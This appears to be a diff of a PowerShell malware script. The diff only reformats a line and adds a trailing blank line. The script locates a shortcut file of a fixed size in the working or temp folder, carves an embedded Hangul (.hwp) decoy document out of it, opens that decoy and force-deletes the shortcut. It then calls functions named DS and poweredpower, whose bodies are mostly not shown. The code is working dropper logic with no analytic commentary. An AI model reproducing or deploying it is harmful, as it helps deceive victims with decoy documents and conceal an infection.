@@ -1,4 +1,5 @@
-$lk=ls -Path '.\' | Where {$_.length -eq 56397};if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};$n=$lk.name.Replace('.lnk','.hwp');$lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];$fPath=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fPath,$file1);&$fPath;ri $lk -force;
+$lk=ls -Path '.\' | Where {$_.length -eq 56397};
+if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};$n=$lk.name.Replace('.lnk','.hwp');$lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];$fPath=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fPath,$file1);&$fPath;ri $lk -force;
 
 Function DS
 {
@@ -43,3 +44,4 @@ function poweredpower
 	
 }
 poweredpower
+
